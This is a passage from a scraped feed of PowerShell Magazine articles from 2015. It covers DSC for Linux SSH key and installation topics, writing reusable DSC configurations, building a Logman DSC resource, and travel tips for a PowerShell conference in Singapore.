\u0026#39;md5\u0026#39; } } } nxSshAuthorizedKeys Last resource added in this release should address issue of managing SSH keys for a given user. With nxSshAuthorizedKeys resource we can deliver keys to any number of nodes and be sure that our private key will work seamlessly with all of them. It will take care of proper file structure and permissions on both .ssh folder and authorized_keys file:\n[root@PSMag ~]# ls /home/bielawb/.ssh/ -las total 4 0 drwx------. 2 bielawb bielawb 28 Jun 14 01:29 . 0 drwx------. 3 bielawb bielawb 90 Jun 14 01:29 .. 4 -rwx------. 1 bielawb bielawb 424 Jun 14 01:29 authorized_keys Something that might require change is rights for authorized_keys files: x is not necessary. It’s not a big issue: keys will work just fine with either.\nThere are two odd things about this resource: first of all, KeyComment is marked as a key in the schema. Probably because there was no natural candidate that could be used: same key value may need to be applied to several users, same user can have multiple keys. Other one is more important: even though schema doesn’t define UserName as required, it is required by the resource. This means that instead of getting errors at compilation phase, we will get them at implementation phase. Example configuration (with actual key removed):\nConfiguration SshKeys { Import-DscResource -ModuleName nx node LinuxNode { nxSshAuthorizedKeys bielawb { Key = \u0026#39;ssh-rsa key description\u0026#39; KeyComment = \u0026#39;How will that work?\u0026#39; UserName = \u0026#39;bielawb\u0026#39; } } } Because there isn’t any strict link between resource key and actual data stored in the file we can easily break existing one by adding single line between comment and actual key data, or by removing comment from the file. If that happens DSC will duplicate the line with a key. It’s not a big issue, but just something that user should be aware of.\nWe now know what we can configure currently with PowerShell DSC for Linux. But there is also huge change in how we can achieve that. We will take a look at that in the third and final part of this series.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/07/08/powershell-dsc-for-linux-resources/","tags":["PowerShell DSC","Linux"],"title":"PowerShell DSC for Linux: Resources"},{"categories":["PowerShell DSC"],"contents":"Both PowerShell and DSC (Desired State Configuration) are designed for efficiency through automation. If you’re not careful though, you’ll find yourself bringing the bad habit of repeating yourself performing the same task over and over again from the GUI to PowerShell and DSC by writing the same or similar code over and over. Not only will you be creating redundant code, but you’ll also have to maintain it.\nEarlier this year, one of my customers began their hardware and software refresh cycle and my job as an infrastructure architect was to configure both the physical and virtual servers in their datacenters.\nAlthough I had been working with DSC in a test lab environment for quite a while and was comfortable configuring their production systems with DSC, my initial configurations for their primary datacenter contained a lot of redundancy. Due to their timeframe for the project, I found myself hard coding values and creating a separate static DSC configuration for each of their servers. If a server had more than one network card, Windows feature, or service, I had each of those items statically configured in the configuration as well which created redundant code within each of the configurations.\nWhile the configurations shown in this article aren’t the ones used for my customer’s environment, the ones provided will help you to understand how my configurations were written. All of these configurations shown in this article are written for servers running Windows Server 2012 R2 with PowerShell 4.0. The xNetworking DSC resource used in these configurations can be downloaded from GitHub: https://github.com/PowerShell/xNetworking. The “x” prefix means it’s experimental.\nIn this scenario, Server01 is a file server and Server02 is a web server. These configurations are simplistic because complexity isn’t required to understand this concept. Notice that these configurations are different when it comes to the Windows features, services, and the number of network cards.\nDSC configuration for Server01:\nConfiguration Server01Config { Import-DscResource -ModuleName PSDesiredStateConfiguration, xNetworking node Server01 { WindowsFeature File-Services { Name = \u0026#39;File-Services\u0026#39; Ensure = \u0026#39;Present\u0026#39; } WindowsFeature FS-FileServer { Name = \u0026#39;FS-FileServer\u0026#39; Ensure = \u0026#39;Present\u0026#39; } xIPAddress IPNIC1 { IPAddress = \u0026#39;192.168.29.171\u0026#39; InterfaceAlias = \u0026#39;Ethernet 2\u0026#39; DefaultGateway = \u0026#39;192.168.29.1\u0026#39; SubnetMask = \u0026#39;24\u0026#39; AddressFamily = \u0026#39;IPv4\u0026#39; } xDNSServerAddress IPNIC1 { Address = \u0026#39;192.168.29.10\u0026#39;, \u0026#39;192.168.29.11\u0026#39; InterfaceAlias = \u0026#39;Ethernet 2\u0026#39; AddressFamily = \u0026#39;IPv4\u0026#39; DependsOn = \u0026#39;[xIPAddress]IPNIC1\u0026#39; } } } Create the MOF (Managed Object Format) file for Server01:\nServer01Config\nFor simplicity, the configurations in this article are being applied via DSC push mode.\nApply the configuration to Server01:\nStart-DscConfiguration -Wait -Path .\\Server01Config –Verbose Configuration for Server02:\nConfiguration Server02Config { Import-DscResource -ModuleName PSDesiredStateConfiguration, xNetworking node Server02 { WindowsFeature Web-Server { Name = \u0026#39;Web-Server\u0026#39; Ensure = \u0026#39;Present\u0026#39; } WindowsFeature Web-Asp-Net45 { Name = \u0026#39;Web-Asp-Net45\u0026#39; Ensure = \u0026#39;Present\u0026#39; } Service W3SVC { Name = \u0026#39;W3SVC\u0026#39; StartupType = \u0026#39;Automatic\u0026#39; State = \u0026#39;Running\u0026#39; DependsOn = \u0026#39;[WindowsFeature]Web-Server\u0026#39; } xIPAddress \u0026#39;IPNIC1\u0026#39; { IPAddress = \u0026#39;192.168.29.172\u0026#39; InterfaceAlias = \u0026#39;Ethernet\u0026#39; DefaultGateway = \u0026#39;192.168.29.1\u0026#39; SubnetMask = \u0026#39;24\u0026#39; AddressFamily = \u0026#39;IPv4\u0026#39; } xDNSServerAddress \u0026#39;IPNIC1\u0026#39; { Address = \u0026#39;192.168.29.10\u0026#39;, \u0026#39;192.168.29.11\u0026#39; InterfaceAlias = \u0026#39;Ethernet\u0026#39; AddressFamily = \u0026#39;IPv4\u0026#39; DependsOn = \u0026#39;[xIPAddress]IPNIC1\u0026#39; } xIPAddress \u0026#39;IPNIC2\u0026#39; { IPAddress = \u0026#39;192.168.29.173\u0026#39; InterfaceAlias = \u0026#39;Ethernet 2\u0026#39; DefaultGateway = \u0026#39;192.168.29.1\u0026#39; SubnetMask = \u0026#39;24\u0026#39; AddressFamily = \u0026#39;IPv4\u0026#39; } xDNSServerAddress \u0026#39;IPNIC2\u0026#39; { Address = \u0026#39;192.168.29.10\u0026#39;, \u0026#39;192.168.29.11\u0026#39; InterfaceAlias = \u0026#39;Ethernet 2\u0026#39; AddressFamily = \u0026#39;IPv4\u0026#39; DependsOn = \u0026#39;[xIPAddress]IPNIC2\u0026#39; } } } Create the MOF file for Server02:\nServer02Config Apply the configuration to Server02:\nStart-DscConfiguration -Wait -Path .\\Server02Config –Verbose As you can see, the code in the previous two configurations is very redundant because each Windows feature and network card is listed individually and both configurations are accomplishing similar tasks, just for different Windows features and the number of network cards.\nAlso, notice how much code redundancy that adding just two network cards creates in a single configuration as shown in the previous example for Server02. Now imagine how much redundant code would exist for a physical Hyper-V host virtualization server with eight or more network cards.\nWhen the same company started the hardware and software refresh cycle for one of their secondary datacenters, I began with a copy of the configurations from the systems in their primary datacenter and I spent my allotted time refactoring the configurations to eliminate redundant code and designing a configuration that was generic enough to be used across all of their systems. This involved separating what’s known as the structural configuration (What) from the environmental configuration (Where).\nThe structural portion of the previously created configurations are close enough that the specifics of each server’s environmental configuration can be removed so that one structural configuration can be used for both. Things like the features and network cards can be run through a foreach loop to eliminate the redundant code within the structural configuration:\nStructural Configuration:\nconfiguration ServerConfig { Import-DscResource -ModuleName PSDesiredStateConfiguration, xNetworking node $AllNodes.NodeName { $Node.WindowsFeature.ForEach({ WindowsFeature $_ { Name = $_ Ensure = \u0026#39;Present\u0026#39; } }) $Node.Service.ForEach({ Service $_.Name { Name = $_.Name StartupType = \u0026#39;Automatic\u0026#39; State = \u0026#39;Running\u0026#39; DependsOn = $_.DependsOn } }) $Node.NIC.ForEach({ xIPAddress $_.ID { IPAddress = $_.IP InterfaceAlias = $_.Adapter DefaultGateway = $_.Gateway SubnetMask = $_.SubnetMask AddressFamily = $_.Family } xDNSServerAddress $_.ID { Address = $_.DNS InterfaceAlias = $_.Adapter AddressFamily = $_.Family DependsOn = $_.DependsOn } }) } } The environmental configuration for both of these servers could be placed into a hash table and stored in a variable or PSD1 file. After working with this for a while, I’ve started to prefer storing the environmental configuration for each server into its own PSD1 file so I don’t mistakenly modify and inadvertently break the configuration for a server that I’m not currently working on which wouldn’t necessarily show up until a new configuration for the affected server was created. Storing each one in a separate PSD1 file also helps to keep track of the changes easier when they’re stored in source control.\nEnvironmental configuration for Server01:\n@{ AllNodes = @( @{ NodeName = \u0026#39;Server01\u0026#39; WindowsFeature = \u0026#39;File-Services\u0026#39;, \u0026#39;FS-FileServer\u0026#39; NIC = @( @{ ID = \u0026#39;IPNIC1\u0026#39; IP = \u0026#39;192.168.29.171\u0026#39; Adapter = \u0026#39;Ethernet 2\u0026#39; Gateway = \u0026#39;192.168.29.1\u0026#39; SubnetMask = \u0026#39;24\u0026#39; Family = \u0026#39;IPv4\u0026#39; DNS = \u0026#39;192.168.29.10\u0026#39;, \u0026#39;192.168.29.11\u0026#39; DependsOn = \u0026#39;[xIPAddress]IPNIC1\u0026#39; } ) } ) } Environmental configuration for Server02:\n@{ AllNodes = @( @{ NodeName = \u0026#39;Server02\u0026#39; WindowsFeature = \u0026#39;Web-Server\u0026#39;, \u0026#39;Web-Asp-Net45\u0026#39; Service = @( @{ Name = \u0026#39;W3SVC\u0026#39; DependsOn = \u0026#39;[WindowsFeature]Web-Server\u0026#39; } ) NIC = @( @{ ID = \u0026#39;IPNIC1\u0026#39; IP = \u0026#39;192.168.29.172\u0026#39; Adapter = \u0026#39;Ethernet\u0026#39; Gateway = \u0026#39;192.168.29.1\u0026#39; SubnetMask = \u0026#39;24\u0026#39; Family = \u0026#39;IPv4\u0026#39; DNS = \u0026#39;192.168.29.10\u0026#39;, \u0026#39;192.168.29.11\u0026#39; DependsOn = \u0026#39;[xIPAddress]IPNIC1\u0026#39; } @{ ID = \u0026#39;IPNIC2\u0026#39; IP = \u0026#39;192.168.29.173\u0026#39; Adapter = \u0026#39;Ethernet 2\u0026#39; Gateway = \u0026#39;192.168.29.1\u0026#39; SubnetMask = \u0026#39;24\u0026#39; Family = \u0026#39;IPv4\u0026#39; DNS = \u0026#39;192.168.29.10\u0026#39;, \u0026#39;192.168.29.11\u0026#39; DependsOn = \u0026#39;[xIPAddress]IPNIC2\u0026#39; } ) } ) } Create the MOF files for both Server01 and Server02:\nGet-ChildItem -Path .\\PSD1 | ForEach-Object {ServerConfig -ConfigurationData $_.FullName} Apply the configuration to both Server01 and Server02:\nStart-DscConfiguration -Wait -Path .\\ServerConfig –Verbose Want to know if this process creates the same configuration as the more static version that was used earlier in this article? Produce the MOF configuration files both ways and compare them.\nThe different methods of creating DSC configurations as shown in this article are simply a means to an end. They’re a way to create the MOF configuration files and it’s those files that are used to apply a configuration to a server. Once the MOF files are created, you won’t need the configurations again until you’re ready to make a configuration change. However, you do need to keep track of your configurations so you know which one is current and so that you’ll have a good starting point when you’re ready to make a change. For this reason, I recommend placing your configurations in some type of source control system. It will make your life so much easier when you don’t make any changes for six months and then you’re trying to figure out where you stored those configurations scripts.\nµ\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/07/07/eliminating-redundant-code-by-writing-reusable-dsc-configurations/","tags":["PowerShell DSC"],"title":"Eliminating Redundant Code by Writing Reusable DSC Configurations"},{"categories":["PowerShell DSC","Linux"],"contents":"First version of PowerShell DSC for Linux is released. We announced that and promised to come back to that subject. It’s time to fulfil that promise. In this article, first part of update series, we will focus on new features and bug fixes related to installation.\nThe first good news is that now both OMI and PowerShell DSC for Linux can be installed on the systems that use deb or rpm packages. This removes requirement of installing development packages previously necessary to compile both products on every node that we want deploy DSC to. Package for OMI can be found at the Open Group page and packages for DSC are distributed in MSI file available on Microsoft Download Center. If we do not own any local package repository, we can install these packages using command for local installation, after we manually download the packages to the Linux box.\nHere is an example for distributions that are using yum as a package manager:\nyum -y localinstall packages/omiserver-1.0.8.ssl_100.x64.rpm yum -y localinstall package/dsc-1.0.0-320.ssl_100.x64.rpm The only change we have to perform is to open ports on firewall to allow inbound WS-Man traffic. For example, when using CentOS 7 with firewalld we would need to call firewall-cmd:\nfirewall-cmd --add-port=5986/tcp --permanent firewall-cmd --reload We have to also enable the OMI server service; even though it is started after installation, it won’t run automatically after reboot:\n[root@PSMag ~]# systemctl status omiserver omiserver.service - OMI CIM Server Loaded: loaded (/usr/lib/systemd/system/omiserver.service; disabled) Active: inactive (dead) The method used to enable the service also depends on distribution/service’s controller. In case of systemd used by CentOS 7, we would have to use systemctl enable/start commands to get OMI server up and running:\nsystemctl enable omiserver systemctl start omiservers I would also suggest to get proper certificate for SSL connections. More details on how to achieve that can be found in one of the previous OMI articles in the PowerShell Magazine.\nThe difference between installing OMI/DSC using packages is that the path to OMI is different than the one we got by default when we installed OMI from the sources. In the current version of the package OMI_HOME points to /opt/omi.\nInstalling OMI from sources is still an option. Unfortunately, installation process in this scenario hasn’t improved much. We still have to make sure that we have sources for both OMI and DSC structured in a fashion that make scripts from DSC expect. There is also one extra requirement for DSC–curl libraries. For example, if we would like to install DSC on a system running CentOS, we would have to request libcurl-devel package:\nyum -y install libcurl-devel Another thing added in this version is the configuration script for DSC. We need to make sure it has proper rights before we can call it (we will use chmod for that). The list of parameters available for configure is limited, but we need to run it first before we can install DSC:\nchmod 755 configure ./configure make make reg In either case, the major problem we observed around installation in CTP version was fixed in this release–ConsistencyInvoker is not only copied to the right location during make reg (you can read about the problem here), it also works as expected and will fix configuration drift if we decide to do so in Local Configuration Manager setting.\nThere are a few important changes in the way DSC providers are structured in version 1.0. Previously all Python scripts used by providers were not designed for any specific Python version. That has changed and if we want to make sure any update to Python script works for any version of Python installed on the box, we have to modify 3 scripts per resource. There are three options present:\n Python 2.4-2.5 Python 2.6-2.7 Python 3  Design is also more modular: a lot of code was moved to the scripts shared between the resources. I believe that is the first step to make it possible to build custom resources with only Get/Test/Set implemented in Python, without a need to implement part of the code that translates MOF document to the actual parameters of the resources. For now, we are limited to resources delivered by the team. Another good news is that the number of resources doubled. We will look at new resources offered in this release in the second part of this series.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/07/06/powershell-dsc-for-linux-installation/","tags":["PowerShell DSC","Linux"],"title":"PowerShell DSC for Linux: Installation"},{"categories":["PowerShell DSC"],"contents":"In this article, we will look at how to get started creating a very simple DSC resource.\nCreating DSC resource is, by many, considered an advanced topic in PowerShell. While that, of course, is true for more complex resources, the purpose of this article is to show that it also can be done relatively easy.\nBackground – what are we trying to accomplish? The purpose of the new resource we will create in this article is to manage Data Collector Sets in Performance Monitor. Data Collector Sets is a collection of performance counters that can be scheduled to run on a regular basis, or started manually.\nHere is an example from a Windows Server 2012 R2 machine, showing the counters available in the default “Server Manager Performance Monitor” introduced in Windows Server 2012:\nData settings for each Data Collector Set can be managed in the Data Manager:\nSeveral settings such as Minimum free disk can be configured by using Data Manager:\nIt is also possible to configure Actions in order to perform tasks like copying the Performance data-gathered by the collector to an alternate location, such as a central file server. In order to manage data growth, it is also possible to configure Actions for deleting files and reports older than a certain age:\nIn the properties of the Data Collector Set, basic settings such as schedules and stop conditions can be managed:\nThat was a lot of settings. Shouldn’t the DSC resource for managing Data Collector Sets be “simple”? It will be, due to the use of templates. A Data Collector Set can be saved as a template in XML format:\nImporting and exporting these templates can be performed by using the command-line utility logman.exe:\nThis means that templates can be managed by using a tool which is familiar to people who is used to working with Performance Counters, while it will be much easier to create a DSC resource for this purpose.\nThe task for our new DSC resource will simply be to create a given Data Collector Set if it does not already exist, based on a template file.\nBonus tip: The PAL (Performance Analysis of Logs) tool is a powerful tool that reads in a performance monitor counter log and analyzes it using known thresholds. It contains template files for most of the major Microsoft products such as Active Directory, IIS, MOSS, SQL Server, BizTalk, Exchange, as well as 3rd party products such as Citrix XenApp and VMware View. These template files can be exported as Performance Monitor template files:\nThis means there is a lot of template files available for our new DSC resource as part of the PAL tool:\nI would recommend you to use these templates as a foundation, import them on a temporary machine, adjust settings such as schedules and actions for uploaded log files to a central location, and then export the customized template.\nThe PAL tool itself is based on PowerShell, so you could also automate the process of analyzing the log files copied to the central location:\nSample output from a PAL Report:\nA full sample report can be found here.\nCreating the Logman DSC Resource\nNow that we have a full understanding of what we are trying to accomplish, we can proceed to create the actual DSC resource. Since its purpose is to ensure that a specific Data Collector Set is present, a natural name for the resource would be “Logman”. Before proceeding to the technical details, it’s a good idea to figure out what properties should be available. In this case we would need at least two properties:\n-DataCollectorSetName: The name of the Data Set Collector. This will be the key property, meaning that this property will uniquely identify a target resource – in this case a Data Set Collector.\n-XmlTemplatePath – The path (either a central UNC path or a local path) to the template exported from Performance Monitor\n-Ensure – This is not required, but I’ve chosen to include it in order to be able to remove obsolete Data Collector Sets\nThis means that our goal is to create a DSC resource which we can use like this:\nLogman Hyper-V { DataCollectorSetName = \u0026#39;Hyper-V\u0026#39; Ensure = \u0026#39;Present\u0026#39; XmlTemplatePath = \u0026#39;C:\\PerfLogs\\Templates\\HyperV.xml\u0026#39; } Instead of creating everything by hand, we are going to leverage the DSC Resource Designer Tool created by the PowerShell team. If you are running WMF 5.0, you can leverage PowerShellGet to download and install the xDSCResourceDesigner module from the PowerShell Gallery:\nFind-Module -Name xDSCResourceDesigner | Install-Module -Force If you are running PowerShell 4.0, which is the minimum version required for authoring DSC configurations and resources), you can download the latest version from the xDSCResourceDesigner repository on GitHub.\nWhen the module is installed, we can list the available commands using Get-Command:\nIn our scenario, we will use New-xDscResourceProperty to define the properties we need (DataCollectorSetName, Ensure, and XmlTemplatePath). And then, we will use New-xDscResource to create the resource.\nBefore we do that we will need to create a PowerShell module to create the new resource into.\nNew-Item -Path \u0026#34;$env:ProgramFiles\\WindowsPowerShell\\Modules\u0026#34; -Name PSCommunityDSCResources -ItemType Directory The minimum requirement for the new module is having a module manifest, as the version number specified in the manifest also will be the version of the DSC resource.\nNew-ModuleManifest -Path \u0026#34;$env:ProgramFiles\\WindowsPowerShell\\Modules\\PSCommunityDSCResources\\PSCommunityDSCResources.psd1\u0026#34; -Guid (([guid]::NewGuid()).Guid) -Author \u0026#39;Jan Egil Ring\u0026#39; -CompanyName PSCommunity -ModuleVersion 1.0 -Description \u0026#39;Example DSC Resource Module for PSCommunity\u0026#39; -PowerShellVersion 4.0 -FunctionsToExport \u0026#39;*.TargetResource\u0026#39; Next, we can go ahead and create the DSC resource by using the two mentioned commands from the xDSCResourceDesigner module:\n# Define DSC resource properties  $DataCollectorSetName = New-xDscResourceProperty -Type String -Name DataCollectorSetName -Attribute Key $Ensure = New-xDscResourceProperty -Name Ensure -Type String -Attribute Write -ValidateSet \u0026#34;Present\u0026#34;, \u0026#34;Absent\u0026#34; $XmlTemplatePath = New-xDscResourceProperty -Name XmlTemplatePath -Type String -Attribute Required # Create the DSC resource  New-xDscResource -Name Logman -Property $DataCollectorSet,$Ensure,$XmlTemplatePath -Path \u0026#34;$env:ProgramFiles\\WindowsPowerShell\\Modules\\PSCommunityDSCResources\u0026#34; -ClassVersion 1.0 -FriendlyName Logman –Force We should now have the following file and folder structure in the module folder:\nThe Logman.schema.mof file defines the 3 parameters we defined when creating the resource, and no further changes to this file is required.\nThe Logman.psm1 file contains a ready-to-use template for the 3 required PowerShell functions Get-, Set-, and Test-TargetResource.\nYou can see the complete template file in the middle of this article on the PowerShell Team blog, where you also can find other details about using the xDSCResourceDesigner module.\nOur task is now to edit the three functions in the Logman.psm1 file so they perform the required tasks.\nLet us start with Get-TargetResource, which should return a hash table containing the three properties for our resource. Since logman is a text-based command-line tool, we will need to parse the information we are interested in. In this scenario we want the name of all Data Collector Sets, and this use Select-String and the –replace operator to extract this information. If the query contains the value of the $DataCollectorSetName variable, we will set the value of $Ensure to $true. We then create a hash table containing the 3 properties, which is then returned as output from the function:\n$logmanquery = (logman.exe query $DataCollectorSetName | Select-String -Pattern Name) -replace \u0026#39;Name: \u0026#39;, \u0026#39;\u0026#39; if ($logmanquery -contains $DataCollectorSetName) { $Ensure = $true } else { $Ensure = $false } $returnValue = @{ DataCollectorSetName = $DataCollectorSetName Ensure = $Ensure XmlTemplatePath = $XmlTemplatePath } $returnValue Note that we do not calculate or gather the value of $XmlTemplatePath, we simply use the value which is specified by the DSC configuration author.\nNext is Set-TargetResource; this function should contain the necessary logic to put the target resource (in our case a Data Collector Set) into the desired state. It should not return any output, but Debug and/or Verbose messages is recommended in order to make it easier to see what is happening during a consistency check. Since we decided to implement the Ensure property, we will also need to create the necessary logic based on whether the value of Ensure is Present or Absent:\nif( $Ensure -eq \u0026#39;Present\u0026#39; ) { if (Test-Path -Path $XmlTemplatePath) { Write-Verbose -Message \u0026#34;Importing logman Data Collector Set $DataCollectorSetName from Xml template $XmlTemplatePath\u0026#34; $null = logman.exe import -n $DataCollectorSetName -xml $XmlTemplatePath } else { Write-Verbose -Message \u0026#34;$XmlTemplatePath not found or temporary inaccessible, trying again on next consistency check\u0026#34; } } elseif( $Ensure -eq \u0026#39;Absent\u0026#39; ) { Write-Verbose -Message \u0026#34;Removing logman Data Collector Set $DataCollectorSetName\u0026#34; $null = logman.exe delete $DataCollectorSetName } Last is Test-TargetResource which should return a Boolean $true or $false. We reuse the same logman query as used in Get-TargetResource and returns the appropriate the Boolean based on the value of $Ensure and whether the Data Collector Set exists or not:\n$logmanquery = (logman.exe query $DataCollectorSetName | Select-String -Pattern Name) -replace \u0026#39;Name: \u0026#39;, \u0026#39;\u0026#39; if ($logmanquery -contains $DataCollectorSetName) { Write-Verbose -Message \u0026#34;Data Collector $DataCollectorSetName exists\u0026#34; if( $Ensure -eq \u0026#39;Present\u0026#39; ) { return $true } elseif ( $Ensure -eq \u0026#39;Absent\u0026#39; ) { return $false } } else { Write-Verbose -Message \u0026#34;Data Collector $DataCollectorSetName does not exist\u0026#34; if( $Ensure -eq \u0026#39;Present\u0026#39; ) { return $false } elseif ( $Ensure -eq \u0026#39;Absent\u0026#39; ) { return $true } } Due to the implementation of Ensure, the code might be a bit more complicated than necessary. However, this shouldn`t be too hard if you have some experience with scripting constructs in PowerShell.\nAt this point, we are ready to test our new resource. By running Get-DscResource we can see whether it is registered properly as a valid resource. Highlighted in the following screenshot, it looks fine:\nLet’s start by creating a new configuration. Since this is a custom DSC resource, we need to use Import-DscResource to import it in order for the DSC engine to see it.\nAfter creating a node block, we specify the name of our resource, Logman:\nIn the above example, Ctrl+Space is used to get IntelliSense for valid properties. Note that the PsDscRunAsCredential property is only available in PowerShell 5.0 and later.\nHere is a complete example of using the new resource:\nConfiguration LogmanHyperV { Import-DscResource -ModuleName PSCommunityDSCResources node localhost { Logman Hyper-V { DataCollectorSetName = \u0026#39;Hyper-V\u0026#39; Ensure = \u0026#39;Present\u0026#39; XmlTemplatePath = \u0026#39;\\\\domain.local\\IT-Ops\\Perfmon-templates\\HyperV.xml\u0026#39; } } } LogmanHyperV -OutputPath c:\\temp Start-DscConfiguration -ComputerName localhost -Path C:\\temp -Wait -Verbose After compiling it to a MOF-file and pushing it to the target node using Start-DscConfiguration, we can see the Verbose messages we added to the resource:\nWe could open Performance Monitor to see if the Data Collector Set is present, but it’s also possible to simply run logman to verify:\nIt is important to verify that all aspects of the resource works, thus the following example is using the same configuration as above – but Ensure is now changed to “Absent”:\nAgain, we can use logman to verify that the Data Collector Set was removed.\nThe complete module containing the DSC resource is available in this GitHub repository.\nAs you might notice, I’ve also added a few more items to the module not mentioned above. Specifically the folders Examples, ResourceDesignerScripts, and Tests:\nThese are all based on best practices stated in the article “PowerShell DSC Resource Design and Testing Checklist” written by the PowerShell Team and won’t be covered in detail in this article.\nI would also like to highlight Logman_Example_2.ps1, which shows how our custom resource can be combined with the built-in resources:\nOne feature that I considered adding to the Logman DSC resource was the ability to ensure that the latest version of an XML file was applied. Since that would complicate the *-TargetResource functions I skipped that from the resource itself to keep it simple.\nIn the Logman_Example_2.ps1 I also show an example of using the built-in Script resource in order to re-create the Data Collector Set if the modified date of the central file is newer than the local copy.\nHowever, I do find the use of the Script resource quite ugly, and I would rather suggest you use versioning in the Data Collector Set name in order to deploy updated versions of the XML file. Then you could set the current version to Ensure=’Absent’, and the new version to Ensure=’Present’:\nA couple of things which should be added to the Logman resource to make it complete is Pester tests and error handling. As stated earlier the goal was to show creating a simple DSC resource, and thus those features won’t be covered in this article.\nCreating the Logman DSC resource as a class-based resource In PowerShell 5.0, the process of creating custom DSC resources is drastically simplified due to the use of classes. This means that we no longer need to create a .schema.mof file. The folder structure is also simplified.\nNow we can create the PowerShell module for the new DSC resource in 3 lines:\nNew-Item -Path \u0026#34;$env:ProgramFiles\\WindowsPowerShell\\Modules\u0026#34; -Name PSCommunityDSCClassBasedResources -ItemType Directory New-ModuleManifest -Path \u0026#34;$env:ProgramFiles\\WindowsPowerShell\\Modules\\PSCommunityDSCClassBasedResources\\PSCommunityDSCClassBasedResources.psd1\u0026#34; -Guid (New-Guid).Guid -Author \u0026#39;Jan Egil Ring\u0026#39; -CompanyName PSCommunity -ModuleVersion 1.0 -Description \u0026#39;Example class based DSC Resource module for PSCommunity\u0026#39; -PowerShellVersion 5.0 -DscResourcesToExport * -RootModule PSCommunityDSCClassBasedResources.psm1 New-Item -Path \u0026#34;$env:ProgramFiles\\WindowsPowerShell\\Modules\\PSCommunityDSCClassBasedResources\u0026#34; -Name PSCommunityDSCClassBasedResources.psm1 -ItemType File This gives us the following file and folder structure:\nIn the .psm1 file we define a new class using the class keyword and DscResource declaration introduced in PowerShell 5.0. We then define the properties we previously had to declare in a separate schema.mof file directly inside the new class. Get/Set/Test-TargetResource is replaced by class methods:\nNow that we have the skeleton ready, we can simply copy the code containing the logic for Get/Set/Test from the legacy DSC resource.\nIn class-based resources, we refer to the current instance of a class by using the $this variable. If we need to reference a parameter supplied to the Get/Set/Test methods, we will need to reference them using $this.variablename, not just $variablename. That is the most important thing to edit when copying code from legacy DSC resources. Here is an example where for example $Ensure is changed to $this.Ensure:\nThe rewritten class-based version of the Logman DSC resource is available in this repository on GitHub, as well as on the PowerShell Gallery. To install the module from the PowerShell Gallery, use Install-Module:\nInstall-Module -Name Logman You can find more details about class based resources in the article Writing a custom DSC resource with PowerShell classes on Microsoft TechNet.\nSummary By leveraging the new resource we have created, it should be an easy task to establish baselines for collecting performance data.\nActions in the Data Collector Set’s Data Manager makes it possible to automatically purge and upload log files to a central UNC path.\nIt is also possible to automate analysis of the centrally uploaded log files by using the PAL (Performance Analysis of Logs) tool. This tool also provides many templates for monitoring specific server roles and products such as Hyper-V and VMware.\nThis concludes our walkthrough on how to create a simple DSC resource. We have looked at how to accomplish the task using both the legacy method in PowerShell 4.0, as well as the new and simplified class-based method introduced in PowerShell 5.0.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/07/02/creating-a-simple-dsc-resource/","tags":["PowerShell DSC"],"title":"Creating a Simple DSC Resource"},{"categories":["News"],"contents":"As the PowerShell Conference draws closer, people have been asking a number of travel questions, so we wanted to share some travel tips. This information will appear as a page on http://powershell.asia very soon and will be updated but in the meantime this should be very useful. Please feel free to contact us on the email address below for anything travel related – whether you have a question, you’re sharing a good deal you have found, a good tip, just letting us know where we are staying or any feedback whatsoever, we would love to hear from you!\nIf you’ve never been to Singapore, here’s some information to help you plan your stay.\nQuestions? Contact PSConfAsiaTravel@singaporepowershell.org.\nNote: All prices quoted below are in Singapore Dollars (SG$). Convert…\nEmergency Numbers Police emergency number is 999. For other numbers, see http://www.e101.gov.sg/learn_contacts.html\nHotels and Accommodation Book early!\nNOTE: The Formula 1 Grand Prix coincides with the conference. Because it’s held at the city centre, to avoid tourists and blocked roads, you might want to select a room a bit outside of the centre.\n To keep costs to a minimum, avoid hotels in the city area. It’s easy to get around in Singapore, so you don’t need to stay near the venue. Chinatown is cheaper and it is near the city, so you’ll be surrounded by foods and other amenities. Check out the low-budget hotel chains, including Fragrance Hotel (http://www.fragrancehotel.com/) and Santa Grand Hotel (santagrandhotels.com ). Hotel 81 has a bad reputation for being seedy and “by the hour,” but if you avoid the ones in the Geylang and Joo Chiat red light districts and in Chinatown, they can be just fine. June Blender loves the Wanderlust Hotel, a quirky boutique hotel surrounded by great Indian restaurants. Adventurous? Try Airbnb, com, and Agoda.com. Look for good deals in the Orchard area behind Lucky Plaza.  Formula 1 Grand Prix PowerShell Conference 2015 Asia coincides with the Formula 1 Grand Prix, the only night race in the world where parts of the city centre are transformed into the race track. Microsoft is at the heart of the city centre and very close to the roads used in the race, so if you travel to the office by taxi, you might be detoured around closed roads.\nThe night race takes place on Sunday after our event ends, but qualifying and practice races are scheduled for Friday and Saturday. You might be able to see and hear some of the activity from the Microsoft building. City Centre hotels will be heavily booked and priced up so it is advised to stay a little outside of the city if possible. There will be a larger than average number of tourists in the area during the weekend also.\nEven if you are not a Formula 1 fan, stay an extra night and go to the race. The atmosphere is really enjoyable and there is lots of other entertainment going on. The race itself is exciting under the night lights of Singapore. It’s not to be missed!\nMind your manners!  When riding escalators in Singapore, stay to your left. The right side of the escalator is for people need to run up or down in a hurry. Downtown Singapore has taxi stands. If there’s one nearby, queue up at the stand. It is not polite to hail a taxi near a taxi stand**.**  Taxis Singapore is small, so you can get everywhere by taxi. The Microsoft office is in the Central Business District and easy to find. It is best known as “NTUC Centre”. Taxis from wherever you are to Microsoft should cost no more than $15-$20.\nBooking a taxi is easy in Singapore. Call them or download apps, such as GrabTaxi and ComfortDelGro Taxi Booking. The apps identify your location automatically, which can come in handy for visitors. When you book a taxi, they give you a number, which is displayed in lights on the taxi roof.\nNeed a recommendation? Use Comfort Taxi. Call 6552 1111 or install their ComfortDelGro Taxi Booking app from your favorite app store.\nTaxi drivers in Singapore are very reliable. You don’t need to worry about getting taken on a long ride or being ripped off with mysterious additional charges. However, be aware of the complex mandatory, but legitimate, charges. Save yourself the potential embarrassment caused by questioning them.\n ERP: Fare levied when entering city areas. Charges vary by day and time. Peak hour charges: 135% typical fare on Mon – Fri 6:00 AM to 9:30 AM, Mon – Sat 6:00 PM – midnight. Midnight charges: 150%: Midnight – 6:00 AM. Booking fees: To reserve a taxi, use http://www.taxisingapore.com/ – Please use the link above for contact numbers for booking cabs. Booking fee is $2.50 during off peak hours, 